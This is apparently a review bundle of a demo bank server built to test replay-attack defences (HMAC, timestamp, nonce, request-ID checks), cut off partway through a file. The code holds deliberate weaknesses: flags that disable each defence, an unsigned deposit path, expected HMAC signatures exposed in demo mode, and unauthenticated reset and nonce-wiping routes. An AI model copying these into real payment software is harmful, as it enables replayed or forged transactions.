# Review Bundle

Generated review copy of the requested current files. Source is reproduced in full except credential-bearing literal values, PIN fixtures/defaults, and env-example values, which are replaced with `<REDACTED>`. Runtime values are not embedded.

## Table of contents

- [server/core.js](#servercorejs) — 543 lines
- [server/server.js](#serverserverjs) — 9 lines
- [server/utils/hmac.js](#serverutilshmacjs) — 38 lines
- [server/utils/idempotency.js](#serverutilsidempotencyjs) — 33 lines
- [server/utils/money-oracle.js](#serverutilsmoney-oraclejs) — 36 lines
- [server/utils/nonce.js](#serverutilsnoncejs) — 106 lines
- [server/test/integration.test.js](#servertestintegrationtestjs) — 274 lines
- [server/test/migration.test.js](#servertestmigrationtestjs) — 51 lines
- [server/test/unit.test.js](#servertestunittestjs) — 64 lines
- [client/bank/src/api.js](#clientbanksrcapijs) — 134 lines
- [client/bank/src/App.jsx](#clientbanksrcAppjsx) — 108 lines
- [attack/attack.sh](#attackattacksh) — 286 lines
- [experiments/audit-egress.js](#experimentsaudit-egressjs) — 70 lines
- [experiments/lib/http.js](#experimentslibhttpjs) — 17 lines
- [experiments/recording-proxy.js](#experimentsrecording-proxyjs) — 74 lines
- [experiments/render-documentation.js](#experimentsrender-documentationjs) — 307 lines
- [experiments/results/baseline/check-ports-postrotation.js](#experimentsresultsbaselinecheck-ports-postrotationjs) — 3 lines
- [experiments/results/baseline/collect-environment.js](#experimentsresultsbaselinecollect-environmentjs) — 30 lines
- [experiments/results/baseline/make-stale-payload.js](#experimentsresultsbaselinemake-stale-payloadjs) — 7 lines
- [experiments/results/baseline/make-tamper-source.js](#experimentsresultsbaselinemake-tamper-sourcejs) — 6 lines
- [experiments/results/baseline/run-measured-cases.js](#experimentsresultsbaselinerun-measured-casesjs) — 50 lines
- [experiments/results/baseline/trigger-capture.js](#experimentsresultsbaselinetrigger-capturejs) — 15 lines
- [experiments/run-nonce-memory.js](#experimentsrun-nonce-memoryjs) — 117 lines
- [experiments/run-races.js](#experimentsrun-racesjs) — 80 lines
- [experiments/run-viz-curve.js](#experimentsrun-viz-curvejs) — 39 lines
- [experiments/send-through-proxy.js](#experimentssend-through-proxyjs) — 48 lines
- [experiments/verify-demo-session-flow.js](#experimentsverify-demo-session-flowjs) — 48 lines
- [package.json](#packagejson) — 8 lines
- [server/package.json](#serverpackagejson) — 24 lines
- [server/.env.example](#serverenvexample) — 22 lines

## server/core.js

````js
require('dotenv').config();

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const { createClient } = require('redis');
const { verifySignature } = require('./utils/hmac');
const { verifyNonceResilient, listNonceKeys, clearNonceKeys, sqliteRun, sqliteGet } = require('./utils/nonce');
const { isRequestProcessed } = require('./utils/idempotency');
const { startVizServer, emitVizEvent } = require('./viz-server');

const app = express();
const PORT = Number(process.env.PORT || 3000);
const HOST = process.env.HOST || '0.0.0.0';
const LEGACY_SHARED_SECRET = flag('LEGACY_SHARED_SECRET', true);
const HMAC_SECRET = process.env.HMAC_SECRET || '';
const DB_PATH = path.resolve(__dirname, process.env.SQLITE_DB || './db/bank.db');
const REDIS_URL = process.env.REDIS_URL || 'redis://127.0.0.1:6379';
const NONCE_BACKEND = (process.env.NONCE_STORE || 'redis').toLowerCase();
const NONCE_TTL = Number(process.env.NONCE_TTL || 300);
const NONCE_STORE_FAIL_MODE = (process.env.NONCE_STORE_FAIL_MODE || 'fail-closed').toLowerCase();
const SESSION_TTL = Number(process.env.SESSION_TTL || 900);
const PAST_WINDOW = Number(process.env.TIMESTAMP_PAST_WINDOW_SECONDS || 300);
const FUTURE_WINDOW = Number(process.env.TIMESTAMP_FUTURE_WINDOW_SECONDS || 5);
const VIZ_ENABLED = flag('VIZ_ENABLED', true);
const DEMO_MODE = flag('DEMO_MODE', true);
const DEPOSIT_REPLAY_PROTECTION = flag('DEPOSIT_REPLAY_PROTECTION', true);
const DEFENSES = {
  hmac: flag('DEFENSE_HMAC', true),
  timestamp: flag('DEFENSE_TIMESTAMP', true),
  nonce: flag('DEFENSE_NONCE', true),
  request_id: flag('DEFENSE_REQUEST_ID', true)
};
const CHECK_ORDER = parseOrder(process.env.CHECK_ORDER || 'hmac,timestamp,nonce,request_id,balance');
const experimentLogPath = process.env.EXPERIMENT_LOG || '';
const configId = process.env.CONFIG_ID || 'default';
const scenarioId = process.env.SCENARIO_ID || 'unspecified';
const runId = process.env.RUN_ID || 'unspecified';
const defaultPin = String(process.env.DEMO_PIN || '<REDACTED>');
const db = new sqlite3.Database(DB_PATH);
const redisClient = createClient({ url: REDIS_URL });
redisClient.on('error', (error) => console.error(`Redis client error: ${error.message}`));
const memoryNonces = new Map();
let transactionQueue = Promise.resolve();
let now = () => Date.now();

function flag(name, fallback) {
  const value = process.env[name];
  return value === undefined ? fallback : /^(1|true|yes|on)$/i.test(value);
}

function parseOrder(value) {
  const allowed = new Set(['hmac', 'timestamp', 'nonce', 'request_id', 'balance']);
  const compact = value.toLowerCase().replace(/[\s_-]/g, '');
  if (compact === 'timestampfirst') return ['timestamp', 'hmac', 'nonce', 'request_id', 'balance'];
  if (compact === 'requestidbeforenonce') return ['hmac', 'timestamp', 'request_id', 'nonce', 'balance'];
  const entries = value.split(/[>,\s]+/).map((entry) => entry.trim().toLowerCase()).filter(Boolean);
  const selected = entries.filter((entry) => allowed.has(entry));
  for (const layer of ['hmac', 'timestamp', 'nonce', 'request_id', 'balance']) {
    if (!selected.includes(layer)) selected.push(layer);
  }
  return selected;
}

function run(sql, params = []) { return sqliteRun(db, sql, params); }
function get(sql, params = []) { return sqliteGet(db, sql, params); }
function all(sql, params = []) {
  return new Promise((resolve, reject) => db.all(sql, params, (error, rows) => error ? reject(error) : resolve(rows)));
}

function withTransactionLock(task) {
  const next = transactionQueue.then(task, task);
  transactionQueue = next.catch(() => {});
  return next;
}

async function hasColumn(table, column) {
  const columns = await all(`PRAGMA table_info(${table})`);
  return columns.some((entry) => entry.name === column);
}

function pinDigest(pin, salt) {
  return crypto.scryptSync(String(pin), salt, 32).toString('hex');
}

async function migrateTransactions() {
  const table = await get("SELECT sql FROM sqlite_master WHERE type='table' AND name='transactions'");
  if (!table) return;
  if (!/request_id\s+TEXT\s+UNIQUE/i.test(table.sql || '')) return;
  await run('BEGIN IMMEDIATE');
  try {
    await run('ALTER TABLE transactions RENAME TO transactions_legacy');
    await run(`CREATE TABLE transactions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      request_id TEXT NOT NULL,
      user_id TEXT NOT NULL,
      account_id TEXT NOT NULL,
      type TEXT NOT NULL CHECK(type IN ('DEPOSIT', 'WITHDRAW')),
      amount INTEGER NOT NULL,
      currency TEXT DEFAULT 'BDT',
      status TEXT NOT NULL CHECK(status IN ('SUCCESS', 'FAILED')),
      reason TEXT,
      signature TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES accounts(user_id)
    )`);
    await run(`INSERT INTO transactions (id, request_id, user_id, account_id, type, amount, currency, status, reason, signature, created_at)
      SELECT id, request_id, user_id, account_id, type, amount, currency, status, reason, signature, created_at FROM transactions_legacy`);
    await run('DROP TABLE transactions_legacy');
    await run('COMMIT');
  } catch (error) {
    await run('ROLLBACK').catch(() => {});
    throw error;
  }
}

async function initializeDatabase() {
  await run('PRAGMA journal_mode = WAL');
  await run('PRAGMA foreign_keys = ON');
  await run(`CREATE TABLE IF NOT EXISTS accounts (
    user_id TEXT PRIMARY KEY, username TEXT NOT NULL, balance INTEGER NOT NULL DEFAULT 10000,
    currency TEXT DEFAULT 'BDT', account_id TEXT, pin_salt TEXT, pin_hash TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
  for (const [column, type] of [['account_id', 'TEXT'], ['pin_salt', 'TEXT'], ['pin_hash', 'TEXT']]) {
    if (!(await hasColumn('accounts', column))) await run(`ALTER TABLE accounts ADD COLUMN ${column} ${type}`);
  }
  await run(`CREATE TABLE IF NOT EXISTS transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT, request_id TEXT NOT NULL, user_id TEXT NOT NULL,
    account_id TEXT NOT NULL, type TEXT NOT NULL CHECK(type IN ('DEPOSIT', 'WITHDRAW')),
    amount INTEGER NOT NULL, currency TEXT DEFAULT 'BDT', status TEXT NOT NULL CHECK(status IN ('SUCCESS', 'FAILED')),
    reason TEXT, signature TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES accounts(user_id)
  )`);
  await migrateTransactions();
  if (DEFENSES.request_id) {
    await run("CREATE UNIQUE INDEX IF NOT EXISTS idx_transactions_success_request_id ON transactions(request_id) WHERE status = 'SUCCESS'");
  } else {
    await run('DROP INDEX IF EXISTS idx_transactions_success_request_id');
  }
  await run(`CREATE TABLE IF NOT EXISTS used_nonces (
    user_id TEXT NOT NULL, nonce TEXT NOT NULL, expires_at INTEGER NOT NULL,
    PRIMARY KEY(user_id, nonce)
  )`);
  const accountSalt = crypto.randomBytes(16).toString('hex');
  const accountHash = pinDigest(defaultPin, accountSalt);
  await run(`INSERT OR IGNORE INTO accounts (user_id, username, balance, currency, account_id, pin_salt, pin_hash)
    VALUES ('anis_101', 'Anis Ahmed', 10000, 'BDT', 'acc_777', ?, ?)`, [accountSalt, accountHash]);
  const seededAccount = await get("SELECT pin_hash FROM accounts WHERE user_id = 'anis_101'");
  if (seededAccount && !seededAccount.pin_hash) {
    await run("UPDATE accounts SET pin_salt = ?, pin_hash = ?, account_id = COALESCE(account_id, 'acc_777') WHERE user_id = 'anis_101'", [accountSalt, accountHash]);
  } else {
    await run("UPDATE accounts SET account_id = COALESCE(account_id, 'acc_777') WHERE user_id = 'anis_101'");
  }
  if (NONCE_BACKEND === 'sqlite') await run('DELETE FROM used_nonces WHERE expires_at <= ?', [now()]);
}

function emit(event, data) {
  if (VIZ_ENABLED) emitVizEvent(event, data);
}

async function getDatabaseState() {
  const accounts = await all('SELECT user_id, username, balance, currency, account_id, created_at FROM accounts ORDER BY user_id');
  const transactions = await all(`SELECT id, request_id, user_id, account_id, type, amount, currency, status, reason,
    ${DEMO_MODE ? 'signature' : 'NULL AS signature'}, created_at FROM transactions ORDER BY id DESC LIMIT 20`);
  return { accounts, transactions };
}

async function emitDatabaseUpdate() {
  if (!VIZ_ENABLED) return;
  emit('db-update', await getDatabaseState());
}

async function currentNonceKeys() {
  if (NONCE_BACKEND === 'redis') return listNonceKeys(redisClient);
  if (NONCE_BACKEND === 'memory') return [...memoryNonces.keys()].sort();
  const rows = await all('SELECT user_id, nonce FROM used_nonces WHERE expires_at > ? ORDER BY user_id, nonce', [now()]);
  const namespace = process.env.NONCE_KEY_NAMESPACE;
  return rows.map((row) => namespace ? `used_nonce:${namespace}:${row.user_id}:${row.nonce}` : `used_nonce:${row.user_id}:${row.nonce}`);
}

async function emitNonceUpdate() {
  if (!VIZ_ENABLED) return;
  emit('redis-update', { keys: await currentNonceKeys() });
}

async function clearUsedNonces() {
  if (NONCE_BACKEND === 'redis') return clearNonceKeys(redisClient);
  if (NONCE_BACKEND === 'memory') {
    const deleted = [...memoryNonces.keys()];
    memoryNonces.clear();
    return deleted;
  }
  const rows = await currentNonceKeys();
  await run('DELETE FROM used_nonces');
  return rows;
}

function csv(value) {
  const string = value === undefined || value === null ? '' : String(value);
  return /[",\r\n]/.test(string) ? `"${string.replace(/"/g, '""')}"` : string;
}

function appendExperimentRow(row) {
  if (!experimentLogPath) return;
  const fields = ['config_id', 'scenario_id', 'run_id', 'started_ns', 'ended_ns', 'duration_ns', 'hmac_ns', 'timestamp_ns', 'nonce_ns', 'request_id_ns', 'balance_ns', 'outcome', 'http_status'];
  const exists = fs.existsSync(experimentLogPath);
  if (!exists) fs.appendFileSync(experimentLogPath, `${fields.join(',')}\n`);
  fs.appendFileSync(experimentLogPath, `${fields.map((key) => csv(row[key])).join(',')}\n`);
}

function startTiming() { return process.hrtime.bigint(); }

async function authenticate(req, userId) {
  const header = req.get('authorization') || '';
  const match = /^Bearer\s+(.+)$/i.exec(header);
  const sessionToken = match ? match[1] : '';
  if (sessionToken) {
    let stored;
    try { stored = await redisClient.get(`session:${sessionToken}`); } catch (error) { return { error: 'SESSION_STORE_UNAVAILABLE' }; }
    if (!stored) return { error: 'SESSION_INVALID' };
    const session = JSON.parse(stored);
    if (session.user_id !== userId) return { error: 'SESSION_USER_MISMATCH' };
    return { secret: session.key, session };
  }
  if (LEGACY_SHARED_SECRET && HMAC_SECRET) return { secret: HMAC_SECRET, legacy: true };
  return { error: 'AUTHENTICATION_REQUIRED' };
}

async function verifyAndRememberNonce(userId, nonce) {
  const store = NONCE_BACKEND === 'redis' ? redisClient : NONCE_BACKEND === 'sqlite' ? db : memoryNonces;
  return verifyNonceResilient(store, userId, nonce, { backend: NONCE_BACKEND, ttlSeconds: NONCE_TTL, failMode: NONCE_STORE_FAIL_MODE });
}

function errorResponse(res, statusCode, reason) {
  return res.status(statusCode).json({ status: 'REJECTED', reason });
}

function rejectVisual(reason, amount) {
  emit('transaction-result', { status: 'REJECTED', amount, reason });
}

function validRequest(payload, type) {
  return Boolean(payload && payload.method === 'POST' && payload.path === `/api/${type.toLowerCase()}` && payload.user_id && payload.account_id && payload.currency && payload.nonce && payload.request_id && Number.isSafeInteger(Number(payload.amount)) && Number(payload.amount) > 0 && Number.isFinite(Date.parse(payload.timestamp)));
}

function timingFields() {
  return { hmac_ns: 'skipped', timestamp_ns: 'skipped', nonce_ns: 'skipped', request_id_ns: 'skipped', balance_ns: 'skipped' };
}

async function processTransaction(req, res, type) {
  const started = startTiming();
  const startedNs = started.toString();
  const payload = req.body || {};
  const amount = Number(payload.amount);
  const timings = timingFields();
  let outcome = 'REJECTED';
  let statusCode = 400;
  let finish;
  const complete = (code, reason) => {
    statusCode = code;
    finish = reason;
    outcome = reason === 'ACCEPTED' ? 'ACCEPTED' : reason || 'REJECTED';
  };

  try {
    emit('request-received', { user: payload.user_id, amount, type });
    if (!validRequest(payload, type)) {
      complete(400, 'INVALID_REQUEST');
      return res.status(400).json({ error: 'INVALID_REQUEST' });
    }
    const account = await get('SELECT account_id FROM accounts WHERE user_id = ?', [payload.user_id]);
    if (!account) {
      complete(404, 'ACCOUNT_NOT_FOUND');
      return res.status(404).json({ error: 'ACCOUNT_NOT_FOUND' });
    }
    if (account.account_id !== payload.account_id) {
      complete(403, 'ACCOUNT_OWNERSHIP_FAIL');
      return errorResponse(res, 403, 'ACCOUNT_OWNERSHIP_FAIL');
    }
    const auth = await authenticate(req, payload.user_id);
    if (auth.error) {
      complete(auth.error === 'SESSION_STORE_UNAVAILABLE' ? 503 : 401, auth.error);
      return errorResponse(res, statusCode, auth.error);
    }
    if (auth.session && auth.session.user_id !== payload.user_id) {
      complete(403, 'SESSION_USER_MISMATCH');
      return errorResponse(res, 403, 'SESSION_USER_MISMATCH');
    }

    const checks = {
      hmac: async () => {
        if (!DEFENSES.hmac) return { valid: true, skipped: true };
        const result = verifySignature(payload, auth.secret);
        emit('check-signature', DEMO_MODE
          ? { status: result.valid ? 'PASS' : 'FAIL', expected: result.expected, received: result.received }
          : { status: result.valid ? 'PASS' : 'FAIL' });
        return result;
      },
      timestamp: async () => {
        if (!DEFENSES.timestamp) return { valid: true, skipped: true };
        const skewSeconds = (now() - Date.parse(payload.timestamp)) / 1000;
        const valid = skewSeconds >= -FUTURE_WINDOW && skewSeconds <= PAST_WINDOW;
        emit('check-timestamp', { status: valid ? 'PASS' : 'FAIL', diff: Math.round(skewSeconds), allowedPast: PAST_WINDOW, allowedFuture: FUTURE_WINDOW });
        return { valid, skewSeconds };
      },
      nonce: async () => {
        if (!DEFENSES.nonce) return { valid: true, skipped: true };
        const result = await verifyAndRememberNonce(payload.user_id, payload.nonce);
        emit('check-nonce', { status: result.valid ? 'PASS' : 'FAIL', redisResult: result.redisResult });
        await emitNonceUpdate();
        return result;
      },
      request_id: async () => {
        if (!DEFENSES.request_id) return { valid: true, skipped: true };
        const result = await isRequestProcessed(db, payload.request_id);
        emit('check-requestid', { status: result.processed ? 'FAIL' : 'PASS', found: result.processed });
        return { valid: !result.processed, result };
      },
      balance: async () => ({ valid: true })
    };
    const failureReasons = { hmac: 'SIGNATURE_FAIL', timestamp: 'TIMESTAMP_FAIL', nonce: 'NONCE_FAIL', request_id: 'ALREADY_PROCESSED' };
    for (const layer of CHECK_ORDER) {
      const before = startTiming();
      const result = await checks[layer]();
      timings[`${layer}_ns`] = (startTiming() - before).toString();
      if (result.skipped) timings[`${layer}_ns`] = 'skipped';
      if (!result.valid) {
        if (layer === 'nonce' && result.redisResult === 'STORE_ERROR_FAIL_CLOSED') {
          complete(503, 'NONCE_STORE_UNAVAILABLE');
          rejectVisual('NONCE_STORE_UNAVAILABLE', amount);
          return errorResponse(res, 503, 'NONCE_STORE_UNAVAILABLE');
        }
        const reason = failureReasons[layer];
        const status = layer === 'hmac' ? 401 : layer === 'timestamp' ? 400 : 409;
        complete(status, reason);
        rejectVisual(reason, amount);
        return errorResponse(res, status, reason);
      }
    }

    const transaction = await withTransactionLock(async () => {
      await run('BEGIN IMMEDIATE');
      try {
        if (DEFENSES.request_id && (await isRequestProcessed(db, payload.request_id)).processed) {
          await run('ROLLBACK');
          return { rejected: 'ALREADY_PROCESSED' };
        }
        const row = await get('SELECT balance FROM accounts WHERE user_id = ?', [payload.user_id]);
        if (!row) {
          await run('ROLLBACK');
          return { rejected: 'ACCOUNT_NOT_FOUND' };
        }
        const beforeBalance = startTiming();
        const enough = type === 'DEPOSIT' || row.balance >= amount;
        timings.balance_ns = (startTiming() - beforeBalance).toString();
        emit('check-balance', { status: enough ? 'PASS' : 'FAIL', balance: row.balance, required: amount });
        if (!enough) {
          await run('INSERT INTO transactions (request_id,user_id,account_id,type,amount,currency,status,reason,signature) VALUES (?,?,?,?,?,? ,\'FAILED\',\'INSUFFICIENT_BALANCE\',?)', [payload.request_id, payload.user_id, payload.account_id, type, amount, payload.currency, DEMO_MODE ? payload.signature : null]);
          await run('COMMIT');
          return { rejected: 'INSUFFICIENT_BALANCE', balance: row.balance };
        }
        const delta = type === 'DEPOSIT' ? amount : -amount;
        await run('UPDATE accounts SET balance = balance + ? WHERE user_id = ?', [delta, payload.user_id]);
        const updated = await get('SELECT balance FROM accounts WHERE user_id = ?', [payload.user_id]);
        await run('INSERT INTO transactions (request_id,user_id,account_id,type,amount,currency,status,reason,signature) VALUES (?,?,?,?,?,? ,\'SUCCESS\',NULL,?)', [payload.request_id, payload.user_id, payload.account_id, type, amount, payload.currency, DEMO_MODE ? payload.signature : null]);
        await run('COMMIT');
        return { balance: updated.balance };
      } catch (error) {
        await run('ROLLBACK').catch(() => {});
        throw error;
      }
    });
    if (transaction.rejected) {
      const status = transaction.rejected === 'ACCOUNT_NOT_FOUND' ? 404 : transaction.rejected === 'INSUFFICIENT_BALANCE' ? 400 : 409;
      complete(status, transaction.rejected);
      if (transaction.rejected === 'ACCOUNT_NOT_FOUND') return res.status(status).json({ error: transaction.rejected });
      rejectVisual(transaction.rejected, amount);
      if (transaction.rejected === 'INSUFFICIENT_BALANCE' && VIZ_ENABLED) await emitDatabaseUpdate();
      return errorResponse(res, status, transaction.rejected);
    }
    complete(200, 'ACCEPTED');
    emit('transaction-result', { status: 'ACCEPTED', amount, newBalance: transaction.balance, reason: null });
    if (VIZ_ENABLED) await emitDatabaseUpdate();
    return res.json({ status: 'ACCEPTED', amount, newBalance: transaction.balance });
  } catch (error) {
    if (error.code && error.code.startsWith('SQLITE_CONSTRAINT')) {
      complete(409, 'ALREADY_PROCESSED');
      rejectVisual('ALREADY_PROCESSED', amount);
      return errorResponse(res, 409, 'ALREADY_PROCESSED');
    }
    complete(500, 'INTERNAL_SERVER_ERROR');
    return res.status(500).json({ error: 'INTERNAL_SERVER_ERROR' });
  } finally {
    const ended = startTiming();
    const row = {
      config_id: configId, scenario_id: scenarioId, run_id: runId,
      started_ns: startedNs, ended_ns: ended.toString(), duration_ns: (ended - started).toString(),
      ...timings, outcome, http_status: statusCode
    };
    try { appendExperimentRow(row); } catch (logError) { console.error('EXPERIMENT_LOG write failed:', logError.message); }
  }
}

app.use(cors());
app.use(express.json({ limit: '32kb' }));

app.get('/api/health', (req, res) => res.type('text/plain').send('OK'));

app.post('/api/login', async (req, res) => {
  try {
    const { user_id: userId, pin } = req.body || {};
    if (!userId || pin === undefined) return res.status(400).json({ error: 'INVALID_REQUEST' });
    const account = await get('SELECT user_id, pin_salt, pin_hash FROM accounts WHERE user_id = ?', [String(userId)]);
    if (!account) return res.status(401).json({ error: 'LOGIN_FAILED' });
    const actual = Buffer.from(pinDigest(pin, account.pin_salt), 'hex');
    const expected = Buffer.from(account.pin_hash, 'hex');
    if (actual.length !== expected.length || !crypto.timingSafeEqual(actual, expected)) return res.status(401).json({ error: 'LOGIN_FAILED' });
    const sessionToken = crypto.randomBytes(32).toString('base64url');
    const sessionKey = crypto.randomBytes(32).toString('base64url');
    await redisClient.set(`session:${sessionToken}`, JSON.stringify({ user_id: account.user_id, key: sessionKey }), { EX: SESSION_TTL });
    return res.json({ sessionToken, sessionKey, expiresIn: SESSION_TTL, user_id: account.user_id });
  } catch (error) {
    return res.status(503).json({ error: 'SESSION_STORE_UNAVAILABLE' });
  }
});

app.get('/api/balance/:user_id', async (req, res) => {
  try {
    const account = await get('SELECT user_id, username, balance, currency, account_id FROM accounts WHERE user_id = ?', [req.params.user_id]);
    if (!account) return res.status(404).json({ error: 'ACCOUNT_NOT_FOUND' });
    const auth = await authenticate(req, req.params.user_id);
    if (auth.error) return res.status(auth.error === 'SESSION_STORE_UNAVAILABLE' ? 503 : auth.error === 'SESSION_USER_MISMATCH' ? 403 : 401).json({ error: auth.error });
    res.json(account);
  } catch (error) { res.status(500).json({ error: 'INTERNAL_SERVER_ERROR' }); }
});

app.get('/api/transactions/:user_id', async (req, res) => {
  try {
    const account = await get('SELECT user_id FROM accounts WHERE user_id = ?', [req.params.user_id]);
    if (!account) return res.status(404).json({ error: 'ACCOUNT_NOT_FOUND' });
    const auth = await authenticate(req, req.params.user_id);
    if (auth.error) return res.status(auth.error === 'SESSION_STORE_UNAVAILABLE' ? 503 : auth.error === 'SESSION_USER_MISMATCH' ? 403 : 401).json({ error: auth.error });
    const transactions = await all('SELECT id, request_id, user_id, account_id, type, amount, currency, status, reason, created_at FROM transactions WHERE user_id = ? ORDER BY id DESC', [req.params.user_id]);
    res.json({ transactions });
  } catch (error) { res.status(500).json({ error: 'INTERNAL_SERVER_ERROR' }); }
});

app.post('/api/deposit', async (req, res) => {
  if (!DEPOSIT_REPLAY_PROTECTION) {
    const payload = req.body || {};
    if (!payload.user_id || !payload.request_id || !Number.isInteger(Number(payload.amount)) || Number(payload.amount) <= 0) return res.status(400).json({ error: 'INVALID_REQUEST' });
    try {
      const account = await get('SELECT account_id FROM accounts WHERE user_id = ?', [payload.user_id]);
      if (!account) return res.status(404).json({ error: 'ACCOUNT_NOT_FOUND' });
      if (payload.account_id !== account.account_id) return errorResponse(res, 403, 'ACCOUNT_OWNERSHIP_FAIL');
      const existing = await isRequestProcessed(db, payload.request_id);
      if (existing.processed) return errorResponse(res, 409, 'ALREADY_PROCESSED');
      await withTransactionLock(async () => {
        await run('BEGIN IMMEDIATE');
        await run('UPDATE accounts SET balance = balance + ? WHERE user_id = ?', [Number(payload.amount), payload.user_id]);
        await run("INSERT INTO transactions (request_id,user_id,account_id,type,amount,currency,status,signature) VALUES (?,?,?,'DEPOSIT',?,?,'SUCCESS',NULL)", [payload.request_id, payload.user_id, payload.account_id, Number(payload.amount), payload.currency || 'BDT']);
        await run('COMMIT');
      });
      const updated = await get('SELECT balance FROM accounts WHERE user_id = ?', [payload.user_id]);
      if (VIZ_ENABLED) await emitDatabaseUpdate();
      return res.json({ status: 'ACCEPTED', amount: Number(payload.amount), newBalance: updated.balance });
    } catch (error) { return res.status(500).json({ error: 'INTERNAL_SERVER_ERROR' }); }
  }
  return processTransaction(req, res, 'DEPOSIT');
});

app.post('/api/withdraw', (req, res) => processTransaction(req, res, 'WITHDRAW'));

app.post('/api/reset', async (req, res) => {
  try {
    await run('BEGIN IMMEDIATE');
    await run('DELETE FROM transactions');
    await run("UPDATE accounts SET username='Anis Ahmed', balance=10000, currency='BDT', account_id='acc_777' WHERE user_id='anis_101'");
    await run('COMMIT');
    const cleared = await clearUsedNonces();
    const state = await getDatabaseState();
    const keys = await currentNonceKeys();
    emit('reset', { ...state, clearedNonceKeys: cleared, keys });
    emit('redis-update', { keys });
    await emitDatabaseUpdate();
    res.json({ status: 'RESET', ...state, clearedNonceKeys: cleared, keys });
  } catch (error) {
    await run('ROLLBACK').catch(() => {});
    res.status(500).json({ error: 'INTERNAL_SERVER_ERROR' });
  }
});

app.post('/api/demo/nonce-crash', async (req, res) => {
  try {
    const cleared = await clearUsedNonces();
    await emitNonceUpdate();
    res.json({ ok: true, deleted: cleared.length });
  } catch (error) { res.status(500).json({ error: 'INTERNAL_SERVER_ERROR' }); }
});

if (flag('ENABLE_TEST_FAULT_ROUTE', false)) {
  app.get('/__test/unhandled-error', (req, res, next) => next(new Error('test-only injected failure')));
}
app.use((error, req, res, next) => {
  if (res.headersSent) return next(error);
  if (error instanceof SyntaxError && error.status === 400) return res.status(400).json({ error: 'INVALID_REQUEST' });
  console.error(error);
  return res.status(500).json({ error: 'INTERNAL_SERVER_ERROR' });
});
app.use((req, res) => res.status(404).json({ error: 'NOT_FOUND' }));

async function start() {
  await initializeDatabase();
  try {
    if (!redisClient.isOpen) await redisClient.connect();
    await redisClient.ping();
  } catch (error) {
    if (!LEGACY_SHARED_SECRET) throw error;
    console.error(`Redis unavailable; session login is unavailable and nonce requests follow NONCE_STORE_FAIL_MODE (${NONCE_STORE_FAIL_MODE}).`);
  }
  startVizServer();
  if (VIZ_ENABLED) {
    await emitDatabaseUpdate();
    await emitNonceUpdate().catch(() => {});
  }
  return app.listen(PORT, HOST, () => console.log(`Bank server listening on ${HOST}:${PORT}`));
}

function setClock(clockFn) { now = clockFn; }

module.exports = {
  app, db, redisClient, initializeDatabase, start, setClock, processTransaction,
  config: { LEGACY_SHARED_SECRET, HMAC_SECRET, NONCE_BACKEND, NONCE_TTL, PAST_WINDOW, FUTURE_WINDOW, VIZ_ENABLED, DEMO_MODE, DEPOSIT_REPLAY_PROTECTION, DEFENSES, CHECK_ORDER, NONCE_STORE_FAIL_MODE },
  helpers: { get, all, run, pinDigest, clearUsedNonces, currentNonceKeys, emitDatabaseUpdate, parseOrder }
};

if (require.main === module) {
  start().catch((error) => { console.error(error); process.exit(1); });
}
````

## server/server.js

````js
const core = require('./core');
module.exports = core;

if (require.main === module) {
  core.start().catch((error) => {
    console.error(error);
    process.exit(1);
  });
}
````

## server/utils/hmac.js

````js
const crypto = require('crypto');

function buildHmacMessage(payload) {
  return [
    payload.method,
    payload.path,
    payload.user_id,
    payload.account_id,
    payload.amount,
    payload.currency,
    payload.timestamp,
    payload.nonce,
    payload.request_id
  ].join('|');
}

function generateSignature(payload, secret) {
  const message = buildHmacMessage(payload);
  return crypto.createHmac('sha256', secret).update(message).digest('hex');
}

function verifySignature(payload, secret) {
  const expected = generateSignature(payload, secret);
  const received = payload.signature || '';
  const expectedBuffer = Buffer.from(expected, 'hex');
  const receivedBuffer = /^[0-9a-f]{64}$/i.test(received) ? Buffer.from(received, 'hex') : Buffer.alloc(0);
  return {
    valid: expectedBuffer.length === receivedBuffer.length && crypto.timingSafeEqual(expectedBuffer, receivedBuffer),
    expected,
    received
  };
}

module.exports = {
  buildHmacMessage,
  generateSignature,
  verifySignature
};
````

## server/utils/idempotency.js

````js
function getTransactionByRequestId(db, requestId) {
  return new Promise((resolve, reject) => {
    db.get(
      'SELECT * FROM transactions WHERE request_id = ?', //query to find a transaction by request_id
      [requestId],
      (error, row) => {
        if (error) {
          reject(error);
          return;
        }
        resolve(row || null); // resolve with the found row or null if not found
      }
    );
  });
}

async function isRequestProcessed(db, requestId) {
  const row = await new Promise((resolve, reject) => {
    db.get("SELECT * FROM transactions WHERE request_id = ? AND status = 'SUCCESS' LIMIT 1", [requestId], (error, result) => {
      if (error) return reject(error);
      resolve(result || null);
    });
  });
  return {
    processed: Boolean(row),
    row
  };
}

module.exports = {
  getTransactionByRequestId,
  isRequestProcessed
};
````

## server/utils/money-oracle.js

````js
const crypto = require('crypto');

function payloadFingerprint(payload) {
  const stable = [
    payload.method, payload.path, payload.user_id, payload.account_id,
    payload.amount, payload.currency, payload.timestamp, payload.nonce,
    payload.request_id, payload.signature
  ].join('|');
  return crypto.createHash('sha256').update(stable).digest('hex');
}

function computeMoneyIntegrity(transactions, authorizedPayloads = []) {
  const withdrawals = transactions.filter((row) => row.type === 'WITHDRAW' && row.status === 'SUCCESS');
  const totalDebited = withdrawals.reduce((sum, row) => sum + Number(row.amount), 0);
  const authorizedByFingerprint = new Map();
  for (const payload of authorizedPayloads) authorizedByFingerprint.set(payloadFingerprint(payload), Number(payload.amount));
  const authorizedTotal = [...authorizedByFingerprint.values()].reduce((sum, amount) => sum + amount, 0);
  const counts = new Map();
  const firstAmounts = new Map();
  for (const row of withdrawals) {
    const identity = row.payload_fingerprint || row.signature || `${row.user_id}|${row.request_id}|${row.amount}`;
    counts.set(identity, (counts.get(identity) || 0) + 1);
    firstAmounts.set(identity, Number(row.amount));
  }
  const duplicateDebitCount = [...counts.values()].reduce((sum, count) => sum + Math.max(0, count - 1), 0);
  const duplicateDebitAmount = [...counts.entries()].reduce((sum, [identity, count]) => sum + Math.max(0, count - 1) * firstAmounts.get(identity), 0);
  return {
    totalDebited,
    authorizedTotal,
    duplicateDebitAmount,
    duplicateDebitCount,
